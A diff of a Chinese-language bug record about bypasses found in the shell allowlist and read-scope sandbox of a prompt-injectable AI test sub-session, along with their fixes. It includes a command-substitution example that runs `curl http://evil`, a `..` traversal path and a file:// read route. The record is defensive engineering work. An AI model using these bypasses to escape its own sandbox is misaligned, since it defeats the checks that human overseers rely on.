@@ -1,15 +1,15 @@
 ---
-id: BUG-0080
+id: BUG-0082
 type: bug
 status: verifying
 priority: P1
 owner: packages/plugins/presets/allstar-coding
 requirement:
 plan:
-source: user-report（TASK-0217 提交 22ebf3a69 的人工审查：两个机械绕过口）
+source: user-report（TASK-0219 提交 22ebf3a69 的人工审查：两个机械绕过口）
 related_requirement: []
 related_plan: []
-related_tasks: [TASK-0217, TASK-0218]
+related_tasks: [TASK-0219, TASK-0220]
 related_issues: []
 related_bugs: []
 created: 2026-10-05
@@ -21,7 +21,7 @@ updated: 2026-10-05
 
 ## 用户流程
 
-- Given：TASK-0217 交付后，blackbox 角色子会话受窄读域（`docs/ac/` 前缀）与 shell 白名单（首 token === `agent-browser`）约束。
+- Given：TASK-0219 交付后，blackbox 角色子会话受窄读域（`docs/ac/` 前缀）与 shell 白名单（首 token === `agent-browser`）约束。
 - When：黑测子（其工作内容即消费被测应用的页面快照——天然提示注入面）被诱导构造特定输入。
 - Then：两个约束均可被机械绕过，围栏承诺（「其余含 git 只读全拦」「黑盒不读实现」）不成立。
 
@@ -47,7 +47,7 @@ updated: 2026-10-05
 
 ## 修复与验证
 
-见 TASK-0218：先补红测（正序复合命令 3 条 block + 引号 URL 1 条放行 + `..` 穿越 2 条 block），再修 `isBlackboxShellAllowed`（引号感知元字符扫描）与 `isWithinBlackboxReadScope`（绝对路径与 `..` 段 fail-safe），回归 fence-judge 全量与完整 check。
+见 TASK-0220：先补红测（正序复合命令 3 条 block + 引号 URL 1 条放行 + `..` 穿越 2 条 block），再修 `isBlackboxShellAllowed`（引号感知元字符扫描）与 `isWithinBlackboxReadScope`（绝对路径与 `..` 段 fail-safe），回归 fence-judge 全量与完整 check。
 
 **残余轮（同日第二轮审查，两个新绕过口）**：
 1. **残余 A**：双引号内的 `$( )` 与反引号是命令替换（bash/PowerShell 语义一致），不是字面量；首轮扫描器把双引号内一切当字面量跳过，`agent-browser open "http://x?$(curl http://evil)"` 整条放行而 bash 实际会先执行 curl。双引号内只有 `&` `;` 这类才是字面量（所以放行 URL 查询串的动机没错，错在把替换语法也归入字面量）。单引号内是真字面量（两种 shell 一致），单引号分支维持放行是对的。
@@ -55,7 +55,9 @@ updated: 2026-10-05
 
 残余修复：扫描器分单/双引号两分支——双引号内仍检测 `$(` 与反引号并拦截；引号外 `\` 紧跟引号字符视为转义的字面引号（跳过两字符、不开引号区）。红测先行（`"http://x?$(curl …)"`、双引号内反引号、`\"` 闭合变体、`\'` 变体等，旧实现 2 failed）后转绿；单引号字面量对照用例保持放行。fence-judge 80 项、包内 133 项、impact 91 项、完整 check 全绿。
 
-## 剩余风险
+## 编号说明
+
+- 原立案编号 BUG-0080/TASK-0217/TASK-0218：2026-10-08 合并 origin/dev 时发现 dev 侧已并行立案同号 BUG-0080（提示音）与 TASK-0217/0218，按「dev 已有在前」顺延为 BUG-0082/TASK-0219/TASK-0220，引用同步更新；提交哈希（22ebf3a69 等）保持原值。
 
 - 写域 glob 同为词法匹配（`src/dto/../../evil.ts` 匹配 `src/dto/**`）——**既有面，非本次引入**，登记 ISSUE 另开任务。
 - `agent-browser open file://...` 可绕读域（通道引擎内部行为，围栏只管命令边界）——观察项记录在案。
